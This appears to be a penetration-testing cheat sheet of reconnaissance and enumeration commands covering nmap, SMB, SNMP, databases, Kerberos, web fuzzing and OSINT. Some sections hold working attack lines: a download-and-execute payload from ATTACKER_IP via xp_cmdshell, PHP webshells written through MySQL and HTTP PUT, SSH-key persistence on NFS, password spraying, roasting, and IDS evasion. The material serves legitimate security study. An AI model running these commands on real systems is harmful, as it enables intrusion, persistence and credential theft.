---
icon: info
---

# Information Gathering & Enumeration

### Active Enumeration

#### Nmap

**Basic Scanning**

```bash
# Reveal services with versions
nmap -sV $ip

# Scan from a list of targets
nmap -iL targets.txt

# OS detection + service version
nmap -sV -O $ip

# Fast mode with OS detection
nmap -sV -F -O $ip

# Aggressive scan (all details)
nmap -A $ip
```

**Vulnerability Scanning**

```bash
# Run default scripts + vuln category
nmap --script=default,vuln $ip

# Just vuln scripts
nmap --script vuln $ip

# Service + default scripts combo
nmap -sC -sV $ip

# Specific script by name
nmap --script "ftp*" $ip
```

**Port Range & Output**

```bash
# TCP connect scan all ports, min-rate, save output
nmap -sT -p- --min-rate 10000 -oA scan-results $ip

# UDP scan with aggressive speed
nmap -sU -T4 $ip

# Scan most common 100 ports, fast
nmap -F $ip
```

**Host Discovery**

```bash
# ARP packet host discovery
nmap -PR $ip/24

# ICMP timestamp request
nmap -PP $ip/24

# TCP+ICMP ping scan
nmap -PS22,80,443 $ip/24
```

**Firewall Detection**

```bash
# TCP ACK scan (detect stateful firewall)
nmap -sA $ip

# TCP Window scan
nmap -sW $ip

# NULL scan (no flags set)
nmap -sN $ip

# FIN scan
nmap -sF $ip

# Use NSE scripts
nmap --script firewall-bypass $ip
```

**Firewall & IDS/IPS Evasion**

```bash
# Stealth and slow scan
nmap -sS -T1 $ip

# Decoy scan (spoof source IPs)
nmap -sS -D RND:10 $ip

# Spoofed source IP
nmap -S SPOOFED_IP $ip -e eth0 -Pn

# Fragment packets (bypass packet inspection)
nmap -f $ip

# Change user-agent for HTTP scripts
nmap --script-args http.useragent="Mozilla/5.0" $ip

# Control scan speed (T0=paranoid, T5=insane)
nmap -T2 $ip

# Spoof MAC address
nmap --spoof-mac 0 $ip

# Use proxy
nmap --proxies socks4://127.0.0.1:1080 $ip

# Custom data length
nmap --data-length 25 $ip
```

***

#### Masscan

```bash
# Scan single IP
masscan $ip -p 80,443

# Scan IP range
masscan 10.10.10.0/24 -p 0-65535

# Scan all ports
masscan $ip -p 0-65535

# Exclude ports
masscan $ip -p 0-65535 --excludeports 22

# Control speed
masscan $ip -p 0-65535 --rate 100000

# Randomize hosts
masscan $ip/24 -p 80 --randomize-hosts
```

***

#### Hping3

```bash
# TCP SYN scan on port 80
hping3 -S $ip -p 80 -c 3

# UDP scan
hping3 -2 $ip -p 53

# ICMP ping
hping3 -1 $ip

# Traceroute mode
hping3 --traceroute -V -1 $ip

# Firewall bypass with fragmentation
hping3 -f -S $ip -p 80
```

***

#### Netcat Port Scanning

```bash
# TCP port scan
nc -zv $ip 1-1000

# UDP scan
nc -zvu $ip 1-1000

# Banner grab
nc -v $ip 80
```

***

#### Amass

```bash
# Subdomain enumeration
amass enum -d target.com

# Passive mode
amass enum -passive -d target.com

# Output to file
amass enum -d target.com -o output.txt
```

***

#### OpenVAS

```bash
# Install and start
apt install openvas
gvm-setup
gvm-start

# Access at: https://127.0.0.1:9392
# Default creds: admin / [generated during setup]
```

> Use OpenVAS for comprehensive vulnerability scanning. After scanning, generate a report and review remediation steps.

***

### Protocol Enumeration

#### SMB & NetBIOS

**NetBIOS** runs on port 139; SMB runs on port 445.

```bash
# Enumerate with enum4linux (Linux)
enum4linux -a $ip
enum4linux -U $ip   # users
enum4linux -S $ip   # shares
enum4linux -P $ip   # password policy
enum4linux -G $ip   # groups

# List shares with smbclient
smbclient -L //$ip -N

# Connect to a share
smbclient //$ip/ShareName -U username

# Mount SMB share
mount -t cifs //$ip/Share /mnt/smb -o username=user,password=pass

# Specify minimum SMB version
smbclient -L //$ip --option='client min protocol=NT1'

# Find path of every share
smbmap -H $ip

# Mount VHD file (once share is mounted)
guestmount --add /mnt/smb/file.vhd --inspector --ro -v /mnt/vhd
```

***

#### SNMP

**Simple Network Management Protocol** — UDP port 161/162

```bash
# Enumerate with onesixtyone (community string bruteforce)
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $ip

# Walk SNMP tree
snmpwalk -v2c -c public $ip

# Extended walk
snmpwalk -v2c -c public $ip 1.3.6.1.4.1

# With snmpenum
perl snmpenum.pl $ip public windows.txt

# With snmpcheck
snmpcheck -t $ip -c public
```

**SNMP Components:**

* **MIB** — Management Information Base (database of objects)
* **OID** — Object Identifier (unique address for each object)
* **Community String** — acts like a password (`public` = read, `private` = write)

***

#### NFS

**Network File System** — TCP/UDP port 2049

```bash
# List available shares
showmount -e $ip

# Mount a share
mount -t nfs $ip:/share /mnt/nfs

# Unmount
umount /mnt/nfs

# Write SSH keys to NFS share (persistence)
# 1. Generate key pair locally
ssh-keygen -t rsa

# 2. Write public key to authorized_keys on the share
cat ~/.ssh/id_rsa.pub >> /mnt/nfs/home/user/.ssh/authorized_keys
```

***

#### MySQL

**Default port: 3306**

```bash
# Login
mysql -u root -p -h $ip

# Login with specific credentials
mysql -u username -p'password' -h $ip

# Extract all database details
mysqlcheck -u root -p --all-databases

# Common post-login commands
show databases;
use database_name;
show tables;
select * from table_name;
```

**MySQL Config Locations:**

* **Linux:** `/etc/mysql/mysql.conf.d/mysqld.cnf`
* **Windows:** `C:\ProgramData\MySQL\MySQL Server X.X\my.ini`

**MySQL History:** `~/.mysql_history`

**MySQL to Root:**

```bash
# If running as root, write a webshell
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

# Or use UDF (User Defined Functions) to escalate
```

***

#### Oracle

**Default port: 1521**

```bash
# Find TNS version
nmap --script "oracle-tns-version" -p 1521 -T4 -sV $ip

# Enumerate DB users (using odat)
odat all -s $ip -p 1521

# SID enumeration
odat sidguesser -s $ip

# Brute force credentials
odat passwordguesser -s $ip -d SID
```

***

#### MsSQL

**Microsoft SQL Server — Default port: 1433**

```bash
# Complete enumeration with nmap
nmap -n -v -sV -Pn -p 1433 \
  --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $ip

# Brute force credentials
nmap -p 1433 --script ms-sql-brute $ip

# Login with credentials
mssqlclient.py domain/username:password@$ip -windows-auth

# Common post-login commands
SELECT name FROM sys.databases;
USE database_name;
SELECT * FROM table_name;

# Enable xp_cmdshell (code execution)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# Drop a shell (via xp_cmdshell)
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/shell.ps1'')"';
```

***

#### SMTP

**Simple Mail Transfer Protocol — Port 25 (or 587, 465)**

```bash
# SMTP user enumeration with smtp-user-enum
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $ip
smtp-user-enum -M EXPN -u admin -t $ip
smtp-user-enum -M RCPT -U users.txt -t $ip

# With Metasploit
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS $ip
run

# With nmap
nmap -p 25 --script smtp-enum-users $ip
nmap -p 25 --script smtp-commands $ip
```

***

#### POP3

**Post Office Protocol — Port 110 (plain) / 995 (SSL)**

```bash
# Manual banner grabbing
nc $ip 110
USER username
PASS password
LIST          # list emails
RETR 1        # retrieve email 1

# Nmap enumeration
nmap -p 110 --script pop3-capabilities $ip
```

***

#### Kerberos

**Port 88**

```bash
# Enumerate usernames
./kerbrute_linux_amd64 userenum -d pentesting.local --dc $ip /path/to/wordlist.txt

# Password spray attack
./kerbrute_linux_amd64 passwordspray -v -d pentesting.local --dc $ip users.txt 'Password123'

# ASREP Roasting (get hashes for users with pre-auth disabled)
python3 GetNPUsers.py pentesting.local/ -usersfile users.txt -no-pass -dc-ip $ip

# Kerberoasting (get service ticket hashes)
./GetUserSPNs.py -request domain/username:password -dc-ip $ip
```

***

#### RPC / MSRPC

**RPC: Port 111 | MSRPC: Port 135**

```bash
# Login anonymously
rpcclient -U "" $ip
rpcclient -U "" -N $ip

# Login with credentials
rpcclient -U "username%password" $ip

# Login with hash
rpcclient --pw-nt-hash -U username $ip

# After login — useful commands
rpcclient $> querydispinfo    # display user info
rpcclient $> enumdomusers     # list users
rpcclient $> enumdomgroups    # list groups
rpcclient $> querygroup 0x200 # info about specific group
rpcclient $> enumprivs        # list privileges
rpcclient $> enumprinters     # list printers

# MSRPC enumeration (requires impacket)
python rpcmap.py 'ncacn_ip_tcp:$ip'

# Identify hosts and endpoints
python IOXIDResolver.py -t $ip

# Check for PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
rpcdump.py @$ip | egrep 'MS-RPRN|MS-PAR'
```

***

#### Rsync

**Port 873**

```bash
# Connect to rsync server
rsync rsync://$ip

# List synced files/directories
rsync rsync://$ip/module_name

# Download a file
rsync rsync://$ip/module/file.txt ./

# Upload a file
rsync ./localfile.txt rsync://$ip/module/
```

***

#### SVN

```bash
# Connect and display info
svn info svn://$ip

# Display files
svn list svn://$ip

# Export specific file
svn export svn://$ip/path/to/file

# Check out revisions
svn checkout -r 1 svn://$ip
```

***

### Web Enumeration

#### Curl

```bash
# Grab HTTP headers
curl -I http://$ip

# Send POST request with form data
curl -X POST http://$ip/login.php -d "username=admin&password=pass"

# Upload a file
curl -F "file=@shell.php" http://$ip/upload.php

# PUT method (upload webshell)
curl -X PUT http://$ip/shell.php -d "<?php system($_GET['cmd']); ?>"

# Follow redirects
curl -L http://$ip

# Specify custom header
curl -H "X-Forwarded-For: 127.0.0.1" http://$ip
```

***

#### Gobuster / Dirbuster

```bash
# Regular directory scan with wordlist
gobuster dir -u http://$ip -w /usr/share/wordlists/dirb/common.txt

# With file extension enumeration
gobuster dir -u http://$ip -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

# Filter output (exclude 404)
gobuster dir -u http://$ip -w wordlist.txt -b 404,403

# Increase speed (threads)
gobuster dir -u http://$ip -w wordlist.txt -t 50

# Microsoft SharePoint enumeration
gobuster dir -u http://$ip -w /usr/share/wordlists/sharepoint.txt
```

***

#### ffuf

```bash
# Directory enumeration
ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt

# File enumeration (with extensions)
ffuf -u http://$ip/FUZZ -w wordlist.txt -e .php,.txt,.html

# Show only 200 status codes
ffuf -u http://$ip/FUZZ -w wordlist.txt -mc 200

# Filter 403 status codes
ffuf -u http://$ip/FUZZ -w wordlist.txt -fc 403

# Fuzz GET parameters
ffuf -u "http://$ip/page.php?FUZZ=value" -w params.txt

# Fuzz parameter values
ffuf -u "http://$ip/page.php?id=FUZZ" -w /usr/share/wordlists/numbers.txt

# Brute force login form
ffuf -u http://$ip/login.php -X POST \
  -d "username=admin&password=FUZZ" \
  -w /usr/share/wordlists/rockyou.txt \
  -fc 302

# Enumerate extensions
ffuf -u http://$ip/indexFUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt
```

***

#### Wfuzz

```bash
# Directory enumeration
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt http://$ip/FUZZ

# File fuzzing
wfuzz -c -z file,wordlist.txt http://$ip/FUZZ.php

# Password attack on login form
wfuzz -c -z file,rockyou.txt -d "username=admin&password=FUZZ" http://$ip/login.php

# Enumerate subdomains
wfuzz -c -z file,subdomains.txt -H "Host: FUZZ.target.com" http://$ip

# Filter status codes
wfuzz -c --hc 404 -z file,wordlist.txt http://$ip/FUZZ

# Enumerate parameters
wfuzz -c -z file,params.txt "http://$ip/page.php?FUZZ=value"
```

***

#### Whatweb

```bash
# Basic scan
whatweb http://$ip

# Aggressive scan (more plugin checks)
whatweb -a 3 http://$ip

# Output to file
whatweb http://$ip -o output.txt
```

***

#### CMS Enumeration

**WordPress**

```bash
wpscan --url http://$ip
wpscan --url http://$ip -e u    # enumerate users
wpscan --url http://$ip -e p    # enumerate plugins
wpscan --url http://$ip --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

**Drupal**

```bash
droopescan scan drupal -u http://$ip
```

**Joomla**

```bash
joomscan -u http://$ip
```

***

### Passive / OSINT

#### DNS Enumeration

```bash
# Enumerate subdomains, emails, hosts
theHarvester -d target.com -l 500 -b all

# DNSRecon
dnsrecon -d target.com
dnsrecon -d target.com -t axfr   # zone transfer attempt

# Sublist3r
sublist3r -d target.com

# Zone transfer with dig
dig axfr @ns1.target.com target.com

# Gobuster DNS mode
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# ffuf subdomain enumeration
ffuf -u http://FUZZ.target.com -w subdomains.txt -H "Host: FUZZ.target.com"
```

**Certificate Transparency Logs:**

* https://crt.sh/?q=%.target.com
* https://transparencyreport.google.com/

***

#### TheHarvester

```bash
# Comprehensive OSINT
theHarvester -d target.com -l 500 -b google,bing,linkedin,shodan

# Specific sources
theHarvester -d target.com -b linkedin   # LinkedIn profiles
theHarvester -d target.com -b shodan     # Shodan hosts
```

***

#### Recon-ng

```bash
# Start recon-ng
recon-ng

# Create a workspace
workspaces create target_name

# List available tables
db schema

# Insert a value
db insert domains domain=target.com

# Install a module
marketplace install recon/domains-hosts/google_site_web

# Load a module
modules load recon/domains-hosts/google_site_web

# Set options
options set SOURCE target.com

# Run
run
```

***

#### Google Dorks

| Dork                                          | Purpose                   |
| --------------------------------------------- | ------------------------- |
| `site:target.com`                             | All pages for domain      |
| `site:target.com filetype:pdf`                | PDF files                 |
| `site:target.com inurl:admin`                 | Admin panels              |
| `intitle:"index of" site:target.com`          | Open directories          |
| `site:target.com ext:php inurl:?`             | PHP pages with parameters |
| `"target.com" filetype:sql`                   | SQL database dumps        |
| `inurl:"/wp-content/uploads" site:target.com` | WordPress uploads         |
| `site:pastebin.com target.com`                | Leaks on Pastebin         |

***

#### Sn1per

```bash
# Basic scan
sniper -t $ip

# Full scan
sniper -t $ip -m massscan

# Passive OSINT scan
sniper -t target.com -m osint
```

***

### Common Ports Reference

| Port      | Service        |
| --------- | -------------- |
| 21        | FTP            |
| 22        | SSH            |
| 23        | Telnet         |
| 25        | SMTP           |
| 53        | DNS            |
| 80/443    | HTTP/HTTPS     |
| 88        | Kerberos       |
| 110/995   | POP3/POP3S     |
| 111       | RPC            |
| 135       | MSRPC          |
| 139/445   | SMB/NetBIOS    |
| 143/993   | IMAP/IMAPS     |
| 161/162   | SNMP           |
| 389/636   | LDAP/LDAPS     |
| 443       | HTTPS          |
| 873       | Rsync          |
| 1433      | MsSQL          |
| 1521      | Oracle         |
| 2049      | NFS            |
| 3306      | MySQL          |
| 3389      | RDP            |
| 5900      | VNC            |
| 5985/5986 | WinRM          |
| 6379      | Redis          |
| 8080/8443 | HTTP Alternate |
